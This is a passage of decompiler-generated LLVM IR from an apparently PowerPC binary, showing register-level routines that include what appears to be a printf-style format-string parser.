  uselistorder label %dec_label_pc_10005800, { 1, 0 }
  uselistorder label %dec_label_pc_100057d4, { 1, 0 }
  uselistorder label %dec_label_pc_100057a8, { 1, 0 }
}

define i32 @function_10005834() local_unnamed_addr {
dec_label_pc_10005834:
  %v0_1000583c = load i32, i32* @r31, align 4
  %v0_10005840 = load i32, i32* @r3, align 4
  %v1_10005848 = add i32 %v0_10005840, 8
  %v2_10005848 = inttoptr i32 %v1_10005848 to i32*
  %v3_10005848 = load i32, i32* %v2_10005848, align 4
  %v1_1000584c = add i32 %v0_10005840, 16
  %v2_1000584c = inttoptr i32 %v1_1000584c to i32*
  %v3_1000584c = load i32, i32* %v2_1000584c, align 4
  %v2_10005854 = sub i32 %v3_1000584c, %v3_10005848
  store i32 %v2_10005854, i32* @r5, align 4
  %v5_10005854 = icmp eq i32 %v2_10005854, 0
  br i1 %v5_10005854, label %dec_label_pc_10005864, label %dec_label_pc_1000585c

dec_label_pc_1000585c:                            ; preds = %dec_label_pc_10005834
  store i32 %v3_10005848, i32* %v2_1000584c, align 4
  store i32 268458084, i32* @lr, align 4
  %v2_10005860 = inttoptr i32 %v3_10005848 to i16*
  %v3_10005860 = call i32 @function_10009c6c(i16* %v2_10005860, i32 %v2_10005854)
  %v0_10005864.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005864

dec_label_pc_10005864:                            ; preds = %dec_label_pc_10005834, %dec_label_pc_1000585c
  %v0_10005864 = phi i32 [ %v0_10005840, %dec_label_pc_10005834 ], [ %v0_10005864.pre, %dec_label_pc_1000585c ]
  %v1_10005864 = add i32 %v0_10005864, 8
  %v2_10005864 = inttoptr i32 %v1_10005864 to i32*
  %v3_10005864 = load i32, i32* %v2_10005864, align 4
  %v1_10005868 = add i32 %v0_10005864, 16
  %v2_10005868 = inttoptr i32 %v1_10005868 to i32*
  %v3_10005868 = load i32, i32* %v2_10005868, align 4
  store i32 %v0_1000583c, i32* @r31, align 4
  %v2_10005870 = sub i32 %v3_10005868, %v3_10005864
  ret i32 %v2_10005870

; uselistorder directives
  uselistorder i32 %v0_10005864, { 1, 0 }
  uselistorder i32 %v3_10005848, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005864, { 1, 0 }
}

define i32 @function_10005884(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10005884:
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg3, i32* @r31, align 4
  store i8 %arg2, i8* %stack_var_-40, align 1
  %v3_100058ac3 = icmp eq i32 %arg3, 0
  %v2_100058b0 = ptrtoint i8* %stack_var_-40 to i32
  br i1 %v3_100058ac3, label %dec_label_pc_100058cc, label %dec_label_pc_100058c0

dec_label_pc_100058a8:                            ; preds = %dec_label_pc_100058c0
  %v1_100058a8 = add i32 %v0_100058a8, -1
  store i32 %v1_100058a8, i32* @r31, align 4
  %v3_100058ac = icmp eq i32 %v1_100058a8, 0
  %v0_100058b8 = load i32, i32* @r29, align 4
  br i1 %v3_100058ac, label %dec_label_pc_100058cc.loopexit, label %dec_label_pc_100058c0

dec_label_pc_100058c0:                            ; preds = %dec_label_pc_10005884, %dec_label_pc_100058a8
  %v0_100058b85 = phi i32 [ %v0_100058b8, %dec_label_pc_100058a8 ], [ %arg1, %dec_label_pc_10005884 ]
  store i32 268458180, i32* @lr, align 4
  %v3_100058c0 = inttoptr i32 %v0_100058b85 to i16*
  %v4_100058c0 = call i32 @function_10009d4c(i32 %v2_100058b0, i32 1, i16* %v3_100058c0)
  %v3_100058c4 = icmp eq i32 %v4_100058c0, 1
  %v0_100058a8 = load i32, i32* @r31, align 4
  br i1 %v3_100058c4, label %dec_label_pc_100058a8, label %dec_label_pc_100058cc.loopexit

dec_label_pc_100058cc.loopexit:                   ; preds = %dec_label_pc_100058a8, %dec_label_pc_100058c0
  %v0_100058d0.ph = phi i32 [ %v0_100058a8, %dec_label_pc_100058c0 ], [ 0, %dec_label_pc_100058a8 ]
  %v1_100058d0.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100058cc

dec_label_pc_100058cc:                            ; preds = %dec_label_pc_100058cc.loopexit, %dec_label_pc_10005884
  %v1_100058d0 = phi i32 [ 0, %dec_label_pc_10005884 ], [ %v1_100058d0.pre, %dec_label_pc_100058cc.loopexit ]
  %v0_100058d0 = phi i32 [ 0, %dec_label_pc_10005884 ], [ %v0_100058d0.ph, %dec_label_pc_100058cc.loopexit ]
  %v2_100058d0 = sub i32 %v1_100058d0, %v0_100058d0
  ret i32 %v2_100058d0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100058cc.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_100058c0, { 1, 0 }
}

define i32 @function_100058e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100058e4:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  %v1_100058f8 = and i32 %arg2, 128
  %v3_100058f8 = icmp eq i32 %v1_100058f8, 0
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_100058f8, label %dec_label_pc_10005948, label %dec_label_pc_10005914

dec_label_pc_10005914:                            ; preds = %dec_label_pc_100058e4
  %v0_10005914 = call i32 @function_10007288()
  %v0_10005918 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10005914, i32* @r31, align 4
  %v0_10005920 = load i32, i32* %r26.global-to-local, align 4
  %v1_10005924 = load i32, i32* %r30.global-to-local, align 4
  %v2_10005924 = sub i32 %v1_10005924, %v0_10005914
  store i32 %v2_10005924, i32* %r29.global-to-local, align 4
  store i32 %v0_10005914, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_10005924, 1
  br i1 %tmp7, label %dec_label_pc_10005948, label %dec_label_pc_10005934

dec_label_pc_10005934:                            ; preds = %dec_label_pc_10005914
  %v1_10005918 = urem i32 %v0_10005918, 128
  store i32 268458296, i32* @lr, align 4
  %v3_10005934 = trunc i32 %v1_10005918 to i8
  %v4_10005934 = call i32 @function_10005884(i32 %v0_10005920, i8 %v3_10005934, i32 %v2_10005924)
  %v0_10005938 = load i32, i32* @r31, align 4
  store i32 %v0_10005938, i32* %r30.global-to-local, align 4
  %v1_1000593c = load i32, i32* @r29, align 4
  %v4_1000593c = icmp eq i32 %v4_10005934, %v1_1000593c
  store i32 %v4_10005934, i32* @r28, align 4
  br i1 %v4_1000593c, label %dec_label_pc_10005934.dec_label_pc_10005948_crit_edge, label %dec_label_pc_1000596c

dec_label_pc_10005934.dec_label_pc_10005948_crit_edge: ; preds = %dec_label_pc_10005934
  %v0_10005954.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10005948

dec_label_pc_10005948:                            ; preds = %dec_label_pc_10005934.dec_label_pc_10005948_crit_edge, %dec_label_pc_10005914, %dec_label_pc_100058e4
  %v0_10005954 = phi i32 [ %v0_10005954.pre, %dec_label_pc_10005934.dec_label_pc_10005948_crit_edge ], [ %v0_10005920, %dec_label_pc_10005914 ], [ %arg1, %dec_label_pc_100058e4 ]
  %v0_10005950 = phi i32 [ %v0_10005938, %dec_label_pc_10005934.dec_label_pc_10005948_crit_edge ], [ %v0_10005914, %dec_label_pc_10005914 ], [ %arg3, %dec_label_pc_100058e4 ]
  %tmp8 = icmp slt i32 %v0_10005950, 1
  br i1 %tmp8, label %dec_label_pc_10005968, label %dec_label_pc_10005960

dec_label_pc_10005960:                            ; preds = %dec_label_pc_10005948
  %v0_1000594c = load i32, i32* @r27, align 4
  store i32 268458340, i32* @lr, align 4
  %v3_10005960 = inttoptr i32 %v0_10005954 to i16*
  %v4_10005960 = call i32 @function_10009d4c(i32 %v0_1000594c, i32 %v0_10005950, i16* %v3_10005960)
  br label %dec_label_pc_10005968

dec_label_pc_10005968:                            ; preds = %dec_label_pc_10005948, %dec_label_pc_10005960
  %v1_10005968 = phi i32 [ 0, %dec_label_pc_10005948 ], [ %v4_10005960, %dec_label_pc_10005960 ]
  %v0_10005968 = load i32, i32* @r28, align 4
  %v2_10005968 = add i32 %v0_10005968, %v1_10005968
  br label %dec_label_pc_1000596c

dec_label_pc_1000596c:                            ; preds = %dec_label_pc_10005934, %dec_label_pc_10005968
  %v0_10005970 = phi i32 [ %v4_10005934, %dec_label_pc_10005934 ], [ %v2_10005968, %dec_label_pc_10005968 ]
  ret i32 %v0_10005970

; uselistorder directives
  uselistorder i32 %v0_10005950, { 1, 0 }
  uselistorder i32 %v2_10005924, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1000596c, { 1, 0 }
  uselistorder label %dec_label_pc_10005968, { 1, 0 }
}

define i32 @function_10005984() local_unnamed_addr {
dec_label_pc_10005984:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_2()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_2()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_10005988 = load i32, i32* @lr, align 4
  store i32 %v0_10005988, i32* %r0.global-to-local, align 4
  %v2_10005990 = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_10005990, i32* %r30.global-to-local, align 4
  %v0_10005994 = load i32, i32* @r3, align 4
  store i32 %v0_10005994, i32* %r24.global-to-local, align 4
  %v0_100059a0 = load i32, i32* @r5, align 4
  store i32 %v0_100059a0, i32* %r31.global-to-local, align 4
  %v0_100059a4 = load i32, i32* @r4, align 4
  store i32 %v0_100059a4, i32* @r29, align 4
  store i32 268458412, i32* @lr, align 4
  %v1_100059a8 = bitcast i8** %stack_var_-200 to i32*
  %v2_100059a8 = call i32 @function_10005ff4(i32* %v1_100059a8)
  %tmp72 = icmp sgt i32 %v2_100059a8, -1
  br i1 %tmp72, label %dec_label_pc_100059dc, label %dec_label_pc_100059b4

dec_label_pc_100059b4:                            ; preds = %dec_label_pc_10005984
  %v3_100059b4 = load i8*, i8** %stack_var_-200, align 4
  %v4_100059b4 = ptrtoint i8* %v3_100059b4 to i32
  store i32 %v4_100059b4, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_100059b4, i32* @r3, align 4
  %v0_100059c0 = call i32 @function_10007288()
  %v3_100059c4 = icmp eq i32 %v0_100059c0, 0
  br i1 %v3_100059c4, label %dec_label_pc_10005fdc, label %dec_label_pc_100059cc

dec_label_pc_100059cc:                            ; preds = %dec_label_pc_100059b4
  %v0_100059cc = load i32, i32* @r31, align 4
  %v0_100059d0 = load i32, i32* %r24.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100059d8.232 to i32), i32* @lr, align 4
  %v3_100059d4 = inttoptr i32 %v0_100059d0 to i16*
  %v4_100059d4 = call i32 @function_10009d4c(i32 %v0_100059cc, i32 %v0_100059c0, i16* %v3_100059d4)
  br label %dec_label_pc_10005fdc

dec_label_pc_100059dc:                            ; preds = %dec_label_pc_10005984
  %v0_100059e0 = load i32, i32* @r31, align 4
  store i32 268458472, i32* @lr, align 4
  %v2_100059e4 = call i32 @function_100060b0(i32 %v2_10005990, i32 %v0_100059e0)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_10005a7c = zext i8 %tmp59 to i32
  %v2_10005a80 = icmp sgt i32 %tmp60, 0
  %v2_10005a84 = ptrtoint i32* %stack_var_-112 to i32
  %v2_10005aa8 = ptrtoint i32* %stack_var_-344 to i32
  %v3_10005aac = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_10005ae0 = icmp eq i32 %tmp57, 0
  %v2_10005e3c = ptrtoint i32* %stack_var_-328 to i32
  %v2_10005d5c = ptrtoint i32* %stack_var_-340 to i32
  %v2_10005d60 = ptrtoint i32* %stack_var_-336 to i32
  %v5_10005bd4 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_10005cb0 = icmp eq i32 %tmp57, 1
  %v2_10005c54 = icmp ugt i32 %tmp57, 2
  %v4_10005b94 = zext i8 %tmp55 to i32
  %v0_10005fc8.pre = load i32, i32* @r29, align 4
  %v1_10005a94 = mul nuw nsw i32 %v4_10005a7c, 8
  %v2_10005a98 = add i32 %v2_10005a84, %v1_10005a94
  %v1_10005a9c = add i32 %v2_10005a98, -8
  %v1_10005ab0 = add i32 %tmp58, 1
  %v2_10005b08 = icmp ugt i32 %tmp57, 7
  %v2_10005ce8 = icmp ugt i32 %tmp57, 15
  %v2_10005d1c = icmp ugt i32 %tmp57, 17
  %v3_10005d1c = icmp eq i32 %tmp57, 17
  %v2_10005dc4 = icmp ugt i32 %tmp57, 19
  %v3_10005dc4 = icmp eq i32 %tmp57, 19
  %v3_10005e30 = icmp eq i32 %tmp57, 20
  %v1_10005b20 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1000e5e4.234 to i32), i32 -1)
  %v2_10005b20 = inttoptr i32 %v1_10005b20 to i8*
  %v3_10005c60 = icmp eq i32 %tmp57, 3
  %v3_10005c70 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_10005fc8

dec_label_pc_100059f4.backedge:                   ; preds = %dec_label_pc_10005a48, %dec_label_pc_10005a00
  %storemerge13.in = phi i32 [ %v1_10005a10, %dec_label_pc_10005a00 ], [ %v1_10005a48, %dec_label_pc_10005a48 ]
  %v1_10005a0816 = phi i32 [ %v0_10005a20, %dec_label_pc_10005a00 ], [ %v1_10005a48, %dec_label_pc_10005a48 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_100059f4

dec_label_pc_100059f4:                            ; preds = %dec_label_pc_100059f4.backedge, %dec_label_pc_10005fc8
  %v0_10005a20 = phi i32 [ %v1_10005a0816, %dec_label_pc_100059f4.backedge ], [ %v0_10005fc8, %dec_label_pc_10005fc8 ]
  %v1_10005a10 = phi i32 [ %storemerge13, %dec_label_pc_100059f4.backedge ], [ %v0_10005fc8, %dec_label_pc_10005fc8 ]
  %v1_100059f4 = inttoptr i32 %v1_10005a10 to i8*
  %v2_100059f4 = load i8, i8* %v1_100059f4, align 1
  %v3_100059f4 = zext i8 %v2_100059f4 to i32
  store i32 %v3_100059f4, i32* %r0.global-to-local, align 4
  %v3_100059f8 = icmp eq i8 %v2_100059f4, 0
  br i1 %v3_100059f8, label %dec_label_pc_10005a08, label %dec_label_pc_10005a00

dec_label_pc_10005a00:                            ; preds = %dec_label_pc_100059f4
  %v3_10005a00 = icmp eq i8 %v2_100059f4, 37
  br i1 %v3_10005a00, label %dec_label_pc_10005a08, label %dec_label_pc_100059f4.backedge

dec_label_pc_10005a08:                            ; preds = %dec_label_pc_10005a00, %dec_label_pc_100059f4
  %v4_10005a08 = icmp eq i32 %v1_10005a10, %v0_10005a20
  br i1 %v4_10005a08, label %dec_label_pc_10005a3c, label %dec_label_pc_10005a10

dec_label_pc_10005a10:                            ; preds = %dec_label_pc_10005a08
  %v2_10005a10 = sub i32 %v1_10005a10, %v0_10005a20
  store i32 %v2_10005a10, i32* @r31, align 4
  %v4_10005a10 = icmp sgt i32 %v2_10005a10, 0
  br i1 %v4_10005a10, label %dec_label_pc_10005a20, label %dec_label_pc_10005a30

dec_label_pc_10005a20:                            ; preds = %dec_label_pc_10005a10
  %v0_10005a28 = load i32, i32* %r24.global-to-local, align 4
  store i32 268458544, i32* @lr, align 4
  %v3_10005a2c = inttoptr i32 %v0_10005a28 to i16*
  %v4_10005a2c = call i32 @function_10009d4c(i32 %v0_10005a20, i32 %v2_10005a10, i16* %v3_10005a2c)
  %v1_10005a30.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005a30

dec_label_pc_10005a30:                            ; preds = %dec_label_pc_10005a10, %dec_label_pc_10005a20
  %v1_10005a38 = phi i32 [ %v1_10005a30.pre, %dec_label_pc_10005a20 ], [ %v2_10005a10, %dec_label_pc_10005a10 ]
  %storemerge2 = phi i32 [ %v4_10005a2c, %dec_label_pc_10005a20 ], [ 0, %dec_label_pc_10005a10 ]
  %v4_10005a30 = icmp eq i32 %storemerge2, %v1_10005a38
  br i1 %v4_10005a30, label %dec_label_pc_10005a38, label %dec_label_pc_10005fd8

dec_label_pc_10005a38:                            ; preds = %dec_label_pc_10005a30
  %v0_10005a38 = load i32, i32* %r23.global-to-local, align 4
  %v2_10005a38 = add i32 %v0_10005a38, %v1_10005a38
  store i32 %v2_10005a38, i32* %r23.global-to-local, align 4
  %v0_10005a3c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10005a3c

dec_label_pc_10005a3c:                            ; preds = %dec_label_pc_10005a08, %dec_label_pc_10005a38
  %v0_10005a48 = phi i32 [ %v0_10005a20, %dec_label_pc_10005a08 ], [ %v0_10005a3c.pre, %dec_label_pc_10005a38 ]
  %v1_10005a3c = inttoptr i32 %v0_10005a48 to i8*
  %v2_10005a3c = load i8, i8* %v1_10005a3c, align 1
  %v3_10005a3c = zext i8 %v2_10005a3c to i32
  store i32 %v3_10005a3c, i32* %r0.global-to-local, align 4
  %v3_10005a40 = icmp eq i8 %v2_10005a3c, 0
  br i1 %v3_10005a40, label %dec_label_pc_10005fdc, label %dec_label_pc_10005a48

dec_label_pc_10005a48:                            ; preds = %dec_label_pc_10005a3c
  %v1_10005a48 = add i32 %v0_10005a48, 1
  %v2_10005a48 = inttoptr i32 %v1_10005a48 to i8*
  %v3_10005a48 = load i8, i8* %v2_10005a48, align 1
  %v4_10005a48 = zext i8 %v3_10005a48 to i32
  store i32 %v4_10005a48, i32* %r0.global-to-local, align 4
  %v3_10005a50 = icmp eq i8 %v3_10005a48, 37
  br i1 %v3_10005a50, label %dec_label_pc_100059f4.backedge, label %dec_label_pc_10005a58

dec_label_pc_10005a58:                            ; preds = %dec_label_pc_10005a48
  store i32 %v2_10005990, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_10005a48, i8** %stack_var_-200, align 4
  store i32 268458608, i32* @lr, align 4
  %v3_10005a6c = call i32 @function_100063bc(i32* %v1_100059a8, i32 %v1_10005a48)
  store i32 %v2_10005990, i32* @r3, align 4
  store i32 268458616, i32* @lr, align 4
  %v0_10005a74 = call i32 @function_1000610c()
  store i32 %v4_10005a7c, i32* %r7.global-to-local, align 4
  store i32 %v2_10005a84, i32* %r0.global-to-local, align 4
  br i1 %v2_10005a80, label %dec_label_pc_10005a94, label %dec_label_pc_10005aa0

dec_label_pc_10005a94:                            ; preds = %dec_label_pc_10005a58
  br label %dec_label_pc_10005aa0

dec_label_pc_10005aa0:                            ; preds = %dec_label_pc_10005a58, %dec_label_pc_10005a94
  %v0_10005acc82 = phi i32 [ %v1_10005a9c, %dec_label_pc_10005a94 ], [ %v2_10005a84, %dec_label_pc_10005a58 ]
  store i32 %v0_10005acc82, i32* %r10.global-to-local, align 4
  store i32 %v2_10005aa8, i32* %r8.global-to-local, align 4
  store i32 %v1_10005ab0, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_10005ad0.preheader, label %dec_label_pc_10005ad0.preheader.thread

dec_label_pc_10005ad0.preheader.thread:           ; preds = %dec_label_pc_10005aa0
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10005adc

dec_label_pc_10005ad0.preheader:                  ; preds = %dec_label_pc_10005aa0
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_10005aac, label %dec_label_pc_10005adc, label %dec_label_pc_10005ac8.preheader

dec_label_pc_10005ac8.preheader:                  ; preds = %dec_label_pc_10005ad0.preheader
  store i32 %v0_10005acc82, i32* %stack_var_-344, align 4
  %v1_10005acc83 = add i32 %v0_10005acc82, 8
  store i32 %v1_10005acc83, i32* %r10.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_10005ad888 = add i32 %tmp58, -1
  store i32 %v1_10005ad888, i32* %ctr.global-to-local, align 4
  %v2_10005ad889 = icmp eq i32 %v1_10005ad888, 0
  br i1 %v2_10005ad889, label %dec_label_pc_10005adc, label %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge

dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge: ; preds = %dec_label_pc_10005ac8.preheader, %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge
  %v1_10005ac8.pre = phi i32 [ %v1_10005ac8.pre.pre, %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge ], [ %v2_10005aa8, %dec_label_pc_10005ac8.preheader ]
  %v1_10005ad091 = phi i32 [ %v1_10005ad0, %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge ], [ 4, %dec_label_pc_10005ac8.preheader ]
  %v1_10005acc90 = phi i32 [ %v1_10005acc, %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge ], [ %v1_10005acc83, %dec_label_pc_10005ac8.preheader ]
  %v3_10005ac8 = add i32 %v1_10005ac8.pre, %v1_10005ad091
  %v4_10005ac8 = inttoptr i32 %v3_10005ac8 to i32*
  store i32 %v1_10005acc90, i32* %v4_10005ac8, align 4
  %v0_10005acc = load i32, i32* %r10.global-to-local, align 4
  %v1_10005acc = add i32 %v0_10005acc, 8
  store i32 %v1_10005acc, i32* %r10.global-to-local, align 4
  %v0_10005ad0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10005ad0 = mul i32 %v0_10005ad0, 4
  store i32 %v1_10005ad0, i32* %r0.global-to-local, align 4
  %v1_10005ad4 = add i32 %v0_10005ad0, 1
  store i32 %v1_10005ad4, i32* %r11.global-to-local, align 4
  %v0_10005ad8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10005ad8 = add i32 %v0_10005ad8, -1
  store i32 %v1_10005ad8, i32* %ctr.global-to-local, align 4
  %v2_10005ad8 = icmp eq i32 %v1_10005ad8, 0
  br i1 %v2_10005ad8, label %dec_label_pc_10005adc, label %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge

dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge.dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge_crit_edge: ; preds = %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge
  %v1_10005ac8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge

dec_label_pc_10005adc:                            ; preds = %dec_label_pc_10005ac8.preheader, %dec_label_pc_10005ac8.dec_label_pc_10005ac8_crit_edge, %dec_label_pc_10005ad0.preheader.thread, %dec_label_pc_10005ad0.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_10005ae0, label %dec_label_pc_10005ae8, label %dec_label_pc_10005b08

dec_label_pc_10005ae8:                            ; preds = %dec_label_pc_10005adc
  %v0_10005aec = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10005aec, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_10005aec, 0
  %v1_10005af4 = zext i1 %tmp96 to i32
  %v2_10005af4 = ashr i32 %v0_10005aec, 31
  %v3_10005af4 = and i32 %v2_10005af4, -2
  %v4_10005af4 = or i32 %v3_10005af4, %v1_10005af4
  store i32 %v4_10005af4, i32* @r5, align 4
  %v1_10005afc = call i32 @__asm_rlwinm(i32 %v0_10005c1c, i32 0, i32 20, i32 23)
  store i32 %v1_10005afc, i32* @r4, align 4
  %v1_10005b00 = inttoptr i32 %v1_10005afc to i16*
  %v2_10005b00 = call i32 @function_1000a030(i16* %v1_10005b00)
  br label %dec_label_pc_10005fc4

dec_label_pc_10005b08:                            ; preds = %dec_label_pc_10005adc
  br i1 %v2_10005b08, label %dec_label_pc_10005ce8, label %dec_label_pc_10005b10

dec_label_pc_10005b10:                            ; preds = %dec_label_pc_10005b08
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_10005b20 = load i8, i8* %v2_10005b20, align 1
  %v4_10005b20 = zext i8 %v3_10005b20 to i32
  store i32 %v4_10005b20, i32* %r30.global-to-local, align 4
  %v3_10005b24 = icmp eq i8 %v3_10005b20, 10
  br i1 %v3_10005b24, label %dec_label_pc_10005b2c, label %dec_label_pc_10005b54

dec_label_pc_10005b2c:                            ; preds = %dec_label_pc_10005b10
  store i32 %v0_10005c1c, i32* %r0.global-to-local, align 4
  %v1_10005b30 = call i32 @__asm_rlwinm(i32 %v0_10005c1c, i32 26, i32 31, i32 31)
  %v1_10005b34 = call i32 @__asm_rlwinm(i32 %v0_10005c1c, i32 27, i32 31, i32 31)
  %v3_10005b38 = icmp eq i32 %v1_10005b30, 0
  %v2_10005b3c = icmp ne i32 %v1_10005b34, 0
  %not.v2_10005b3c = xor i1 %v2_10005b3c, true
  %v6_10005b40 = sext i1 %not.v2_10005b3c to i32
  store i32 %v6_10005b40, i32* %r0.global-to-local, align 4
  %v1_10005b48 = select i1 %v2_10005b3c, i32 44, i32 87
  store i32 %v1_10005b48, i32* %r31.global-to-local, align 4
  br i1 %v3_10005b38, label %dec_label_pc_10005b54, label %dec_label_pc_10005b50

dec_label_pc_10005b50:                            ; preds = %dec_label_pc_10005b2c
  %v1_10005b50 = or i32 %v1_10005b48, 128
  store i32 %v1_10005b50, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005b54

dec_label_pc_10005b54:                            ; preds = %dec_label_pc_10005b10, %dec_label_pc_10005b2c, %dec_label_pc_10005b50
  %v0_10005b54 = load i32, i32* %r11.global-to-local, align 4
  %v2_10005b54 = icmp ugt i32 %v0_10005b54, 5
  br i1 %v2_10005b54, label %dec_label_pc_10005b7c, label %dec_label_pc_10005b5c

dec_label_pc_10005b5c:                            ; preds = %dec_label_pc_10005b54
  %v3_10005b5c = icmp eq i32 %v0_10005b54, 3
  br i1 %v3_10005b5c, label %dec_label_pc_10005b64, label %dec_label_pc_10005b6c

dec_label_pc_10005b64:                            ; preds = %dec_label_pc_10005b5c
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005b80

dec_label_pc_10005b6c:                            ; preds = %dec_label_pc_10005b5c
  %v3_10005b6c = icmp eq i32 %v0_10005b54, 1
  br i1 %v3_10005b6c, label %dec_label_pc_10005b84, label %dec_label_pc_10005b80

dec_label_pc_10005b7c:                            ; preds = %dec_label_pc_10005b54
  %v0_10005b7c = load i32, i32* %r30.global-to-local, align 4
  %v1_10005b7c = sub i32 0, %v0_10005b7c
  store i32 %v1_10005b7c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005b80

dec_label_pc_10005b80:                            ; preds = %dec_label_pc_10005b6c, %dec_label_pc_10005b64, %dec_label_pc_10005b7c
  br label %dec_label_pc_10005b84

dec_label_pc_10005b84:                            ; preds = %dec_label_pc_10005b6c, %dec_label_pc_10005b80
  %storemerge3 = phi i32 [ 11, %dec_label_pc_10005b80 ], [ 6, %dec_label_pc_10005b6c ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_10005b84 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10005b84, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_10005b84, -1
  br i1 %tmp75, label %dec_label_pc_10005b98, label %dec_label_pc_10005b94

dec_label_pc_10005b94:                            ; preds = %dec_label_pc_10005b84
  br label %dec_label_pc_10005b98

dec_label_pc_10005b98:                            ; preds = %dec_label_pc_10005b84, %dec_label_pc_10005b94
  %storemerge = phi i32 [ %v4_10005b94, %dec_label_pc_10005b94 ], [ 32, %dec_label_pc_10005b84 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_10005b98 = icmp eq i32 %v0_10005b54, 1
  br i1 %v3_10005b98, label %dec_label_pc_10005bb4, label %dec_label_pc_10005ba4

dec_label_pc_10005ba4:                            ; preds = %dec_label_pc_10005b98
  %v0_10005ba4 = load i32, i32* %r7.global-to-local, align 4
